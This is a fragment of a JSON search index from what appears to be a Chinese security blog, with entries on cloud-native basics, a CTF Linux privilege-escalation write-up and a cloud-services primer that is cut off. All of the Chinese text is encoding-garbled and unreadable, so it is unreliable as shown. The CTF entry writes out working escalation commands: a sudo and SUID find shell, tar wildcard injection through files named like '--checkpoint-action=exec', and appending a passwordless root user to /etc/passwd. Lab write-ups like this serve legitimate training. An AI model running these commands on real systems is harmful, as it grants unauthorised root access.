        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/",
        "content": "äº‘åŸç”ŸåŸºç¡€çŸ¥è¯† æ­£å¼å¼€å§‹äº‘åŸç”Ÿå®‰å…¨çš„å­¦ä¹ ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹ç›¸å…³çš„åŸºç¡€çŸ¥è¯†\nå¸¸è§åè¯ è®°å½•ä¸€äº›å¸¸è§çš„ä¸“ä¸šæœ¯è¯­çš„æ„æ€\nå®¹å™¨ è¿™ç©æ„æ‰“CTFçš„åº”è¯¥éƒ½æ¯”è¾ƒç†Ÿæ‚‰\nDocker æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç è½¯ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾å¹³å°ï¼Œç”¨äºå¼€å‘åº”ç”¨ã€äº¤ä»˜ï¼ˆshippingï¼‰åº”ç”¨ã€è¿è¡Œåº”ç”¨ã€‚Dockerå…è®¸ç”¨æˆ·å°†åŸºç¡€è®¾æ–½ï¼ˆInfrastructureï¼‰ä¸­çš„åº”ç”¨å•ç‹¬åˆ†å‰²å‡ºæ¥ï¼Œå½¢æˆæ›´å°çš„é¢—ç²’ï¼ˆå®¹å™¨ï¼‰ï¼Œä»è€Œæé«˜äº¤ä»˜è½¯ä»¶çš„é€Ÿåº¦\nDocker å®¹å™¨ä¸è™šæ‹Ÿæœºç±»ä¼¼ï¼Œä½†äºŒè€…åœ¨åŸç†ä¸Šä¸åŒ:\nå®¹å™¨æ˜¯å°†æ“ä½œç³»ç»Ÿå±‚è™šæ‹ŸåŒ– è™šæ‹Ÿæœºæ˜¯è™šæ‹ŸåŒ–ç¡¬ä»¶ æŒ‰ç…§ä¸Šé¢çš„æ¯”è¾ƒï¼Œå¯ä»¥çŸ¥é“å®¹å™¨èƒ½æ›´ä¾¿æºé«˜æ•ˆåœ°åˆ©ç”¨æœåŠ¡å™¨\næ¥ä¸‹æ¥ä¸€ä¸‹Dockerå®˜æ–¹ç»™å‡ºçš„æ¶æ„å›¾ï¼š\nå¯ä»¥çœ‹è§é‡Œé¢åŒ…æ‹¬äº†Dockerå®¢æˆ·ç«¯ã€Dockerå®¹å™¨æ‰€åœ¨å®¿ä¸»æœºã€Dockeré•œåƒä»“åº“ä¸‰éƒ¨åˆ†\nè€Œå®¿ä¸»æœºåŒ…æ‹¬äº†Dockerå®ˆæŠ¤è¿›ç¨‹ã€æœ¬åœ°å®¹å™¨ã€æœ¬åœ°é•œåƒï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹Dockerdçš„ä½œç”¨æ˜¯ä¾¦å¬Docker APIè¯·æ±‚å’Œç®¡ç†Dockerå¯¹è±¡\nå®¹å™¨ç¼–æ’ å®¹å™¨ç¼–æ’ï¼ˆContainer Orchestrationï¼‰æ˜¯æŒ‡è‡ªåŠ¨åŒ–å®¹å™¨çš„éƒ¨ç½²ã€ç®¡ç†ã€æ‰©å±•å’Œè”ç½‘ï¼Œå®¹å™¨ç¼–æ’å¯ä»¥ä¸ºéœ€è¦éƒ¨ç½²å’Œç®¡ç†æˆç™¾ä¸Šåƒä¸ª Linux å®¹å™¨å’Œä¸»æœºçš„ä¼ä¸šæä¾›ä¾¿åˆ©\nå¸¸è§çš„å®¹å™¨ç¼–æ’å·¥å…·æ–¹æ¡ˆæœ‰ Kubernetesã€Docker Swarm å’Œ Apache Mesos ç­‰\næ— æœåŠ¡ æ— æœåŠ¡ï¼ˆserverlessï¼‰æ˜¯ä¸€ç§äº‘åŸç”Ÿå¼€å‘æ¨¡å‹ï¼Œå¯ä½¿å¼€å‘äººå‘˜ä¸“æ³¨æ„å»ºå’Œè¿è¡Œåº”ç”¨ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¼€å‘è€…ä¸ç”¨å»ç®¡æœåŠ¡å™¨åªè´Ÿè´£å¼€å‘å°±è¡Œ\næ— æœåŠ¡è®¡ç®—äº§å“é€šå¸¸è¢«åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«æ˜¯åç«¯å³æœåŠ¡ï¼ˆBaaSï¼‰å’Œå‡½æ•°å³æœåŠ¡ï¼ˆFaaSï¼‰ï¼Œå…¶ä¸­ FaaS æ˜¯ Serverless çš„ä¸»è¦å®ç°æ–¹å¼ï¼ŒFaaS çš„ç›¸å…³äº§å“ä¸»è¦æœ‰ AWS çš„ Lambdaã€Azure çš„ Functions Serverless Computeã€GCP çš„ Firebase Cloud Functionsã€é˜¿é‡Œäº‘çš„ Function Compute ç­‰\nå¾®æœåŠ¡ å¾®æœåŠ¡ï¼ˆMicroservicesï¼‰æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„é£æ ¼ï¼Œå®ƒæ˜¯ä»¥ä¸“æ³¨äºå•ä¸€è´£ä»»ä¸åŠŸèƒ½çš„å°å‹åŠŸèƒ½åŒºå—ä¸ºåŸºç¡€ï¼Œåˆ©ç”¨æ¨¡å—åŒ–çš„æ–¹å¼ç»„åˆå‡ºå¤æ‚çš„å¤§å‹åº”ç”¨ç¨‹åºï¼Œå„åŠŸèƒ½åŒºå—ä½¿ç”¨ä¸è¯­è¨€æ— å…³çš„APIé›†ç›¸äº’é€šä¿¡\næœåŠ¡ç½‘æ ¼ æœåŠ¡ç½‘æ ¼ï¼ˆService Meshï¼‰ç”¨äºæ§åˆ¶åº”ç”¨çš„ä¸åŒéƒ¨åˆ†ä¹‹é—´å¦‚ä½•å…±äº«æ•°æ®ï¼ŒæœåŠ¡ç½‘æ ¼å†…ç½®äºåº”ç”¨ç¨‹åºä¸­çš„ä¸“ç”¨åŸºç¡€æ¶æ„å±‚ï¼Œè¿™ä¸ªå¯è§çš„åŸºç¡€æ¶æ„å±‚å¯ä»¥è®°å½•åº”ç”¨çš„ä¸åŒéƒ¨åˆ†æ˜¯å¦èƒ½æ­£å¸¸äº¤äº’\näº‘åŸç”Ÿå®‰å…¨ äº‘åŸç”Ÿ äº‘ ï¼šè¿è¡Œåœ¨äº‘æœåŠ¡å™¨ä¸Š åŸç”Ÿ ï¼šå°†åº”ç”¨è¿è¡Œåˆ°äº‘ä¸Šï¼Œå……åˆ†çš„åˆ©ç”¨äº‘è‡ªèº«çš„ç‰¹ç‚¹ï¼Œæ¯”å¦‚å¼¹æ€§å’Œåˆ†å¸ƒå¼ä¼˜åŠ¿ï¼ˆä¸”ä¸šåŠ¡æŒ‰ç…§äº‘æ¥è®¾è®¡ï¼Œè€Œä¸æ˜¯ç®€å•è¿ç§»ï¼‰ äº‘åŸç”ŸæŠ€æœ¯æœ‰åˆ©äºå„ç»„ç»‡åœ¨å…¬æœ‰äº‘ã€ç§æœ‰äº‘å’Œæ··åˆäº‘ç­‰æ–°å‹åŠ¨æ€ç¯å¢ƒä¸­ï¼Œæ„å»ºå’Œè¿è¡Œå¯å¼¹æ€§æ‰©å±•çš„åº”ç”¨ã€‚äº‘åŸç”Ÿçš„ä»£è¡¨æŠ€æœ¯åŒ…æ‹¬å®¹å™¨ã€æœåŠ¡ç½‘æ ¼ã€å¾®æœåŠ¡ã€ä¸å¯å˜åŸºç¡€è®¾æ–½å’Œå£°æ˜å¼ API\näº‘åŸç”Ÿå®‰å…¨ äº‘åŸç”Ÿå®‰å…¨è‡³å°‘åŒ…å«äº†å¾®æœåŠ¡å®‰å…¨ã€æ— æœåŠ¡å®‰å…¨ã€ç¼–æ’å¹³å°å®‰å…¨ã€æœåŠ¡ç½‘æ ¼å®‰å…¨ã€å®¹å™¨å®‰å…¨ã€å®¿ä¸»æœºå®‰å…¨ç­‰ç­‰ã€‚\næ ¹æ®äº‘åŸç”Ÿç¯å¢ƒçš„æ„æˆï¼Œé¢å‘äº‘åŸç”Ÿç¯å¢ƒçš„å®‰å…¨ä½“ç³»å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªå±‚é¢ï¼š\nå®¹å™¨å®‰å…¨ ç¼–æ’ç³»ç»Ÿå®‰å…¨ äº‘åŸç”Ÿåº”ç”¨å®‰å…¨ï¼šåŒ…æ‹¬äº†å¾®æœåŠ¡ã€æ— æœåŠ¡ã€æœåŠ¡ç½‘æ ¼ã€é›¶ä¿¡ä»»ä½“ç³»ã€API å®‰å…¨ç­‰ç­‰ å¦å¤–é™¤äº†è¿™äº›å’Œäº‘åŸç”Ÿç¯å¢ƒç›¸å…³çš„æŠ€æœ¯ä¹‹å¤–ï¼Œäº‘åŸç”Ÿå®‰å…¨è¿˜åŒ…å«äº†ä¸€äº›ä¼ ç»Ÿå®‰å…¨çš„å†…å®¹ï¼Œæ¯”å¦‚å®¿ä¸»æœºçš„å®‰å…¨ç­‰ç­‰ã€‚\n",
        "summary": "äº‘åŸç”ŸåŸºç¡€çŸ¥è¯† æ­£å¼å¼€å§‹äº‘åŸç”Ÿå®‰å…¨çš„å­¦ä¹ ï¼Œé¦–å…ˆäº†è§£ä¸€ä¸‹ç›¸å…³çš„åŸºç¡€çŸ¥è¯†\nå¸¸è§åè¯ è®°å½•ä¸€äº›å¸¸è§çš„ä¸“ä¸šæœ¯è¯­çš„æ„æ€\nå®¹å™¨ è¿™ç©æ„æ‰“CTFçš„åº”è¯¥éƒ½æ¯”è¾ƒç†Ÿæ‚‰\nDocker æ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç è½¯ä»¶ï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾å¹³å°ï¼Œç”¨äºå¼€å‘åº”ç”¨ã€äº¤ä»˜ï¼ˆshippingï¼‰åº”ç”¨ã€è¿è¡Œåº”ç”¨ã€‚Dockerå…è®¸ç”¨æˆ·å°†åŸºç¡€è®¾æ–½ï¼ˆInfrastructureï¼‰ä¸­çš„åº”ç”¨å•ç‹¬åˆ†å‰²å‡ºæ¥ï¼Œå½¢æˆæ›´å°çš„é¢—ç²’ï¼ˆå®¹å™¨ï¼‰ï¼Œä»è€Œæé«˜äº¤ä»˜è½¯ä»¶çš„é€Ÿåº¦\nDocker å®¹å™¨ä¸è™šæ‹Ÿæœºç±»ä¼¼ï¼Œä½†äºŒè€…åœ¨åŸç†ä¸Šä¸åŒ:\nå®¹å™¨æ˜¯å°†æ“ä½œç³»ç»Ÿå±‚è™šæ‹ŸåŒ– è™šæ‹Ÿæœºæ˜¯è™šæ‹ŸåŒ–ç¡¬ä»¶ æŒ‰ç…§ä¸Šé¢çš„æ¯”è¾ƒï¼Œå¯ä»¥çŸ¥é“å®¹å™¨èƒ½æ›´ä¾¿æºé«˜æ•ˆåœ°åˆ©ç”¨æœåŠ¡å™¨\næ¥ä¸‹æ¥ä¸€ä¸‹Dockerå®˜æ–¹ç»™å‡ºçš„æ¶æ„å›¾ï¼š\nå¯ä»¥çœ‹è§é‡Œé¢åŒ…æ‹¬äº†Dockerå®¢æˆ·ç«¯ã€Dockerå®¹å™¨æ‰€åœ¨å®¿ä¸»æœºã€Dockeré•œåƒä»“åº“ä¸‰éƒ¨åˆ†\nè€Œå®¿ä¸»æœºåŒ…æ‹¬äº†Dockerå®ˆæŠ¤è¿›ç¨‹ã€æœ¬åœ°å®¹å™¨ã€æœ¬åœ°é•œåƒï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹Dockerdçš„ä½œç”¨æ˜¯ä¾¦å¬Docker APIè¯·æ±‚å’Œç®¡ç†Dockerå¯¹è±¡\nå®¹å™¨ç¼–æ’ å®¹å™¨ç¼–æ’ï¼ˆContainer Orchestrationï¼‰æ˜¯æŒ‡è‡ªåŠ¨åŒ–å®¹å™¨çš„éƒ¨ç½²ã€ç®¡ç†ã€æ‰©å±•å’Œè”ç½‘ï¼Œå®¹å™¨ç¼–æ’å¯ä»¥ä¸ºéœ€è¦éƒ¨ç½²å’Œç®¡ç†æˆç™¾ä¸Šåƒä¸ª Linux å®¹å™¨å’Œä¸»æœºçš„ä¼ä¸šæä¾›ä¾¿åˆ©\nå¸¸è§çš„å®¹å™¨ç¼–æ’å·¥å…·æ–¹æ¡ˆæœ‰ Kubernetesã€Docker Swarm å’Œ Apache Mesos ç­‰\næ— æœåŠ¡ æ— æœåŠ¡ï¼ˆserverlessï¼‰æ˜¯ä¸€ç§äº‘åŸç”Ÿå¼€å‘æ¨¡å‹ï¼Œå¯ä½¿å¼€å‘äººå‘˜ä¸“æ³¨æ„å»ºå’Œè¿è¡Œåº”ç”¨ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¼€å‘è€…ä¸ç”¨å»ç®¡æœåŠ¡å™¨åªè´Ÿè´£å¼€å‘å°±è¡Œ\næ— æœåŠ¡è®¡ç®—äº§å“é€šå¸¸è¢«åˆ†ä¸ºä¸¤ç±»ï¼Œåˆ†åˆ«æ˜¯åç«¯å³æœåŠ¡ï¼ˆBaaSï¼‰å’Œå‡½æ•°å³æœåŠ¡ï¼ˆFaaSï¼‰ï¼Œå…¶ä¸­ FaaS æ˜¯ Serverless çš„ä¸»è¦å®ç°æ–¹å¼ï¼ŒFaaS çš„ç›¸å…³äº§å“ä¸»è¦æœ‰ AWS çš„ Lambdaã€Azure çš„ Functions Serverless Computeã€GCP çš„ Firebase Cloud Functionsã€é˜¿é‡Œäº‘çš„ Function Compute ç­‰\nå¾®æœåŠ¡ å¾®æœåŠ¡ï¼ˆMicroservicesï¼‰æ˜¯ä¸€ç§è½¯ä»¶æ¶æ„é£æ ¼ï¼Œå®ƒæ˜¯ä»¥ä¸“æ³¨äºå•ä¸€è´£ä»»ä¸åŠŸèƒ½çš„å°å‹åŠŸèƒ½åŒºå—ä¸ºåŸºç¡€ï¼Œåˆ©ç”¨æ¨¡å—åŒ–çš„æ–¹å¼ç»„åˆå‡ºå¤æ‚çš„å¤§å‹åº”ç”¨ç¨‹åºï¼Œå„åŠŸèƒ½åŒºå—ä½¿ç”¨ä¸è¯­è¨€æ— å…³çš„APIé›†ç›¸äº’é€šä¿¡\næœåŠ¡ç½‘æ ¼ æœåŠ¡ç½‘æ ¼ï¼ˆService Meshï¼‰ç”¨äºæ§åˆ¶åº”ç”¨çš„ä¸åŒéƒ¨åˆ†ä¹‹é—´å¦‚ä½•å…±äº«æ•°æ®ï¼ŒæœåŠ¡ç½‘æ ¼å†…ç½®äºåº”ç”¨ç¨‹åºä¸­çš„ä¸“ç”¨åŸºç¡€æ¶æ„å±‚ï¼Œè¿™ä¸ªå¯è§çš„åŸºç¡€æ¶æ„å±‚å¯ä»¥è®°å½•åº”ç”¨çš„ä¸åŒéƒ¨åˆ†æ˜¯å¦èƒ½æ­£å¸¸äº¤äº’\näº‘åŸç”Ÿå®‰å…¨ äº‘åŸç”Ÿ äº‘ ï¼šè¿è¡Œåœ¨äº‘æœåŠ¡å™¨ä¸Š åŸç”Ÿ ï¼šå°†åº”ç”¨è¿è¡Œåˆ°äº‘ä¸Šï¼Œå……åˆ†çš„åˆ©ç”¨äº‘è‡ªèº«çš„ç‰¹ç‚¹ï¼Œæ¯”å¦‚å¼¹æ€§å’Œåˆ†å¸ƒå¼ä¼˜åŠ¿ï¼ˆä¸”ä¸šåŠ¡æŒ‰ç…§äº‘æ¥è®¾è®¡ï¼Œè€Œä¸æ˜¯ç®€å•è¿ç§»ï¼‰ äº‘åŸç”ŸæŠ€æœ¯æœ‰åˆ©äºå„ç»„ç»‡åœ¨å…¬æœ‰äº‘ã€ç§æœ‰äº‘å’Œæ··åˆäº‘ç­‰æ–°å‹åŠ¨æ€ç¯å¢ƒä¸­ï¼Œæ„å»ºå’Œè¿è¡Œå¯å¼¹æ€§æ‰©å±•çš„åº”ç”¨ã€‚äº‘åŸç”Ÿçš„ä»£è¡¨æŠ€æœ¯åŒ…æ‹¬å®¹å™¨ã€æœåŠ¡ç½‘æ ¼ã€å¾®æœåŠ¡ã€ä¸å¯å˜åŸºç¡€è®¾æ–½å’Œå£°æ˜å¼ API\näº‘åŸç”Ÿå®‰å…¨ äº‘åŸç”Ÿå®‰å…¨è‡³å°‘åŒ…å«äº†å¾®æœåŠ¡å®‰å…¨ã€æ— æœåŠ¡å®‰å…¨ã€ç¼–æ’å¹³å°å®‰å…¨ã€æœåŠ¡ç½‘æ ¼å®‰å…¨ã€å®¹å™¨å®‰å…¨ã€å®¿ä¸»æœºå®‰å…¨ç­‰ç­‰ã€‚\næ ¹æ®äº‘åŸç”Ÿç¯å¢ƒçš„æ„æˆï¼Œé¢å‘äº‘åŸç”Ÿç¯å¢ƒçš„å®‰å…¨ä½“ç³»å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªå±‚é¢ï¼š\nå®¹å™¨å®‰å…¨ ç¼–æ’ç³»ç»Ÿå®‰å…¨ äº‘åŸç”Ÿåº”ç”¨å®‰å…¨ï¼šåŒ…æ‹¬äº†å¾®æœåŠ¡ã€æ— æœåŠ¡ã€æœåŠ¡ç½‘æ ¼ã€é›¶ä¿¡ä»»ä½“ç³»ã€API å®‰å…¨ç­‰ç­‰ å¦å¤–é™¤äº†è¿™äº›å’Œäº‘åŸç”Ÿç¯å¢ƒç›¸å…³çš„æŠ€æœ¯ä¹‹å¤–ï¼Œäº‘åŸç”Ÿå®‰å…¨è¿˜åŒ…å«äº†ä¸€äº›ä¼ ç»Ÿå®‰å…¨çš„å†…å®¹ï¼Œæ¯”å¦‚å®¿ä¸»æœºçš„å®‰å…¨ç­‰ç­‰ã€‚\n"
    }
,
    {
        "title": "äº‘å°˜é¶åœº-Linuxææƒç³»åˆ—",
        "link": "/My-Knowlege-Database/blog/%E6%B8%97%E9%80%8F/%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0/%E4%BA%91%E5%B0%98%E9%9D%B6%E5%9C%BA-linux%E6%8F%90%E6%9D%83%E7%B3%BB%E5%88%97/",
        "content": "äº‘å°˜é¶åœº-Linuxææƒç³»åˆ—WP Linuxææƒç³»åˆ—-1 sshè¿æ¥é¶æœºï¼Œé¦–å…ˆè¿›è¡ŒåŸºæœ¬çš„ä¿¡æ¯æ”¶é›†ï¼š\nå‘ç°å½“å‰ctfç”¨æˆ·å¯ä»¥å…å¯†sudoï¼Œä»¥user1çš„èº«ä»½æ‰§è¡Œ/bin/bashï¼Œå¾ˆç»å…¸çš„sudoææƒå˜›ï¼Œç›´æ¥æ¥ï¼š\nsudo -u user1 /bin/bash æˆåŠŸè·å–åˆ°user1çš„BashShellï¼Œçœ‹çœ‹å½“å‰ç›®å½•æœ‰ä»€ä¹ˆï¼š\næˆåŠŸæ‹¿åˆ°äº†flag\nLinuxææƒç³»åˆ—-2 sshè¿æ¥é¶æœºï¼Œé¦–å…ˆè¿›è¡ŒåŸºæœ¬çš„ä¿¡æ¯æ”¶é›†ï¼š\nå‘ç°suidæƒé™é…ç½®ä¸å½“ï¼Œfindå‘½ä»¤æ‹¥æœ‰äº†suidæƒé™ï¼Œçœ‹çœ‹findçš„æ‰€æœ‰è€…ï¼š\næ‰€æœ‰è€…ä¸ºuser2ï¼Œæ„å‘³ç€å¯ä»¥ææƒåˆ°user2ï¼Œé‚£ä¹ˆç›´æ¥ç”¨findææƒï¼š\nfind .profile -exec /bin/bash -p \\; è½»æ¾ææƒåˆ°user2\nè¿›å…¥/home/user2çœ‹çœ‹ï¼š\næˆåŠŸæ‹¿åˆ°flag\nLinuxææƒç³»åˆ—-3 åœ¨ä¿¡æ¯æ”¶é›†æ—¶å‘ç°å­˜åœ¨user3ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ï¼š çœ‹çœ‹å®šæ—¶ä»»åŠ¡è„šæœ¬å†…å®¹ï¼š\nè¿™é‡Œçš„tarå‘½ä»¤ä½¿ç”¨äº†é€šé…ç¬¦ï¼Œå¯ä»¥è€ƒè™‘é€šé…ç¬¦æ³¨å…¥è¿›è¡Œææƒ\né¦–å…ˆåˆ›å»º/tmp/abcd/è·¯å¾„ï¼š\nmkdir /tmp/abcd ç„¶ååˆ›å»ºåˆ©ç”¨æ–‡ä»¶å’Œè„šæœ¬ï¼Œå¹¶èµ‹äºˆæƒé™ï¼š\necho \u0026#39;/usr/bin/cp /usr/bin/find /tmp/myfind \u0026amp;\u0026amp; chmod 4777 /tmp/myfind\u0026#39; \u0026gt; exploit.sh \u0026amp;\u0026amp; echo \u0026#39;\u0026#39; \u0026gt; \u0026#39;--checkpoint=1\u0026#39; \u0026amp;\u0026amp; echo \u0026#39;\u0026#39; \u0026gt; \u0026#39;--checkpoint-action=exec=sh exploit.sh\u0026#39; \u0026amp;\u0026amp; chmod 777 /tmp/abcd/* æ¥ä¸‹æ¥ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶è§¦å‘*çš„é€šé…ç¬¦æ³¨å…¥ï¼Œå¾—åˆ°æ‰€æœ‰è€…ä¸ºuser3ï¼Œä¸”å…·æœ‰suidæƒé™çš„/tmp/myfindï¼š\nå¾—åˆ°åå³å¯ç”¨findè¿›è¡Œsuidææƒè·å¾—user3çš„shell\nç›´æ¥è¯»flagå³å¯ï¼š\nLinuxææƒç³»åˆ—-4 é¦–å…ˆä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼š\nå‘ç°ä¸¤ä¸ªå…å¯†sudoçš„ç©æ„ï¼Œç›´æ¥å…ˆè·å–ä¸€ä¸ªuser1çš„shellï¼š\nä½†æ˜¯æ²¡æœ‰flagï¼Œè¿™æ¬¡åº”è¯¥æ˜¯è¦è·å–rootæƒé™\nå…ˆæƒ³åˆ°åˆ©ç”¨cpï¼š\næ²¡æœ‰æˆåŠŸï¼Œå†çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–çš„åˆ©ç”¨ç‚¹ï¼š\nå¾ˆæ˜æ˜¾passwdæ–‡ä»¶çš„æƒé™é…ç½®ä¸å½“ï¼Œuser1ç”¨æˆ·å¯å†™ï¼Œé‚£ä¹ˆç›´æ¥æ·»åŠ ä¸€ä¸ªrootç”¨æˆ·ï¼š\necho \u0026#39;Yuy0ung::0:0:root:/root/bin/bash\u0026#39; \u0026gt;\u0026gt; /etc/passwd æˆåŠŸææƒï¼Œåœ¨/rootç›®å½•ä¸‹è·å¾—äº†flagï¼š\n",
        "summary": "äº‘å°˜é¶åœº-Linuxææƒç³»åˆ—WP Linuxææƒç³»åˆ—-1 sshè¿æ¥é¶æœºï¼Œé¦–å…ˆè¿›è¡ŒåŸºæœ¬çš„ä¿¡æ¯æ”¶é›†ï¼š\nå‘ç°å½“å‰ctfç”¨æˆ·å¯ä»¥å…å¯†sudoï¼Œä»¥user1çš„èº«ä»½æ‰§è¡Œ/bin/bashï¼Œå¾ˆç»å…¸çš„sudoææƒå˜›ï¼Œç›´æ¥æ¥ï¼š\nsudo -u user1 /bin/bash æˆåŠŸè·å–åˆ°user1çš„BashShellï¼Œçœ‹çœ‹å½“å‰ç›®å½•æœ‰ä»€ä¹ˆï¼š\næˆåŠŸæ‹¿åˆ°äº†flag\nLinuxææƒç³»åˆ—-2 sshè¿æ¥é¶æœºï¼Œé¦–å…ˆè¿›è¡ŒåŸºæœ¬çš„ä¿¡æ¯æ”¶é›†ï¼š\nå‘ç°suidæƒé™é…ç½®ä¸å½“ï¼Œfindå‘½ä»¤æ‹¥æœ‰äº†suidæƒé™ï¼Œçœ‹çœ‹findçš„æ‰€æœ‰è€…ï¼š\næ‰€æœ‰è€…ä¸ºuser2ï¼Œæ„å‘³ç€å¯ä»¥ææƒåˆ°user2ï¼Œé‚£ä¹ˆç›´æ¥ç”¨findææƒï¼š\nfind .profile -exec /bin/bash -p \\; è½»æ¾ææƒåˆ°user2\nè¿›å…¥/home/user2çœ‹çœ‹ï¼š\næˆåŠŸæ‹¿åˆ°flag\nLinuxææƒç³»åˆ—-3 åœ¨ä¿¡æ¯æ”¶é›†æ—¶å‘ç°å­˜åœ¨user3ç”¨æˆ·çš„å®šæ—¶ä»»åŠ¡ï¼š çœ‹çœ‹å®šæ—¶ä»»åŠ¡è„šæœ¬å†…å®¹ï¼š\nè¿™é‡Œçš„tarå‘½ä»¤ä½¿ç”¨äº†é€šé…ç¬¦ï¼Œå¯ä»¥è€ƒè™‘é€šé…ç¬¦æ³¨å…¥è¿›è¡Œææƒ\né¦–å…ˆåˆ›å»º/tmp/abcd/è·¯å¾„ï¼š\nmkdir /tmp/abcd ç„¶ååˆ›å»ºåˆ©ç”¨æ–‡ä»¶å’Œè„šæœ¬ï¼Œå¹¶èµ‹äºˆæƒé™ï¼š\necho \u0026#39;/usr/bin/cp /usr/bin/find /tmp/myfind \u0026amp;\u0026amp; chmod 4777 /tmp/myfind\u0026#39; \u0026gt; exploit.sh \u0026amp;\u0026amp; echo \u0026#39;\u0026#39; \u0026gt; \u0026#39;--checkpoint=1\u0026#39; \u0026amp;\u0026amp; echo \u0026#39;\u0026#39; \u0026gt; \u0026#39;--checkpoint-action=exec=sh exploit.sh\u0026#39; \u0026amp;\u0026amp; chmod 777 /tmp/abcd/* æ¥ä¸‹æ¥ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œæ—¶è§¦å‘*çš„é€šé…ç¬¦æ³¨å…¥ï¼Œå¾—åˆ°æ‰€æœ‰è€…ä¸ºuser3ï¼Œä¸”å…·æœ‰suidæƒé™çš„/tmp/myfindï¼š\nå¾—åˆ°åå³å¯ç”¨findè¿›è¡Œsuidææƒè·å¾—user3çš„shell\nç›´æ¥è¯»flagå³å¯ï¼š\nLinuxææƒç³»åˆ—-4 é¦–å…ˆä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼š\nå‘ç°ä¸¤ä¸ªå…å¯†sudoçš„ç©æ„ï¼Œç›´æ¥å…ˆè·å–ä¸€ä¸ªuser1çš„shellï¼š\n"
    }
,
    {
        "title": "äº‘æœåŠ¡å­¦ä¹ ",
        "link": "/My-Knowlege-Database/blog/%E4%BA%91%E5%AE%89%E5%85%A8/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%AD%A6%E4%B9%A0/",
        "content": "äº‘æœåŠ¡å­¦ä¹  äº‘æœåŠ¡å°±æ˜¯äº‘ä¸Šçš„æœåŠ¡ï¼Œæ¯”å¦‚ä»äº‘å‚å•†ï¼ˆAWSã€é˜¿é‡Œäº‘ï¼‰ä¹°æ¥çš„æœåŠ¡\nå›½å†…äº‘å‚å•†ï¼š\né˜¿é‡Œäº‘ è…¾è®¯äº‘ åä¸ºäº‘ å¤©ç¿¼äº‘ Ucloud é‡‘å±±äº‘ \u0026hellip;\u0026hellip; å›½å¤–äº‘å‚å•†ï¼š\nAWS GCP Azure \u0026hellip;\u0026hellip; æ¯ä¸ªäº‘å‚å•†å¯¹äº‘æœåŠ¡çš„å«æ³•ä¸åŒï¼Œè¿™é‡Œä»¥AWSçš„ä¸ºä¾‹ï¼š\nS3å¯¹è±¡å­˜å‚¨ï¼ˆSimple Storage Serviceï¼‰ï¼Œå¯ä»¥ç®€å•ç†è§£ä¸ºç½‘ç›˜ï¼Œç•¥æœ‰åŒºåˆ« EC2å¼¹æ€§è®¡ç®—æœåŠ¡ï¼ˆElastic Computer Cloudï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘ä¸Šçš„è™šæ‹Ÿæœº RDSäº‘æ•°æ®åº“ï¼ˆRelational Database Serviceï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘ä¸Šæ•°æ®åº“ IAMèº«ä»½ç®¡ç†å’Œè®¿é—®ç®¡ç†ï¼ˆIdentity and Access Managementï¼‰ï¼Œç®€å•ç†è§£ä¸ºäº‘æ§åˆ¶å°ä¸Šçš„ä¸€å¥—èº«ä»½ç®¡ç†æœåŠ¡ï¼Œå¯ä»¥ç”¨æ¥ç®¡ç†æ¯ä¸ªå­è´¦å·çš„æƒé™ ç»¼ä¸Šæ¥çœ‹ï¼Œå…¶å®å¯ä»¥ç®€å•çœ‹ä½œä¸€äº›æœ¬åœ°çš„åŠŸèƒ½/æœåŠ¡æ”¾åˆ°äº†äº‘ä¸Šï¼Œé‚£ä¹ˆå°±ä¼šäº§ç”Ÿå¯¹åº”çš„é£é™©ï¼Œå€¼å¾—ç ”ç©¶\nåœ¨ä¸‹æ–‡çš„æ¡ˆä¾‹å›¾ç‰‡ä¸­ï¼Œç¬”è€…å¯èƒ½ä¼šæ›´å¤šç”¨å›½å†…å‚å•†ï¼ˆæ¯”å¦‚aliyunï¼‰è¿›è¡Œä¸¾ä¾‹ï¼Œæ¼æ´å®ä¾‹ä½¿ç”¨TerraformGoaté¶åœºè¿›è¡Œæ¼”ç¤º\nå­¦ä¹ é¡ºåºå‚è€ƒhttps://wiki.teamssix.com/\nå¯¹è±¡å­˜å‚¨ å¯¹è±¡å­˜å‚¨ï¼ˆObject-Based Storageï¼‰ï¼Œä¹Ÿå¯ä»¥å«åšé¢å‘å¯¹è±¡çš„å­˜å‚¨ï¼Œç°åœ¨ä¹Ÿæœ‰ä¸å°‘å‚å•†ç›´æ¥æŠŠå®ƒå«åšäº‘å­˜å‚¨ï¼Œå¾ˆç»å…¸çš„å°±æ˜¯Amazon S3 (Simple Storage Service) ç®€å•å­˜å‚¨æœåŠ¡ï¼Œæ˜¯ Amazon çš„å…¬å¼€äº‘å­˜å‚¨æœåŠ¡ï¼Œä¸ä¹‹å¯¹åº”çš„åè®®è¢«ç§°ä¸º S3 åè®®ï¼Œç›®å‰ S3 åè®®å·²ç»è¢«è§†ä¸ºå…¬è®¤çš„è¡Œä¸šæ ‡å‡†åè®®ï¼Œå› æ­¤ç›®å‰å›½å†…ä¸»æµçš„å¯¹è±¡å­˜å‚¨å‚å•†åŸºæœ¬ä¸Šéƒ½ä¼šæ”¯æŒ S3 åè®®\nAmazon S3æ 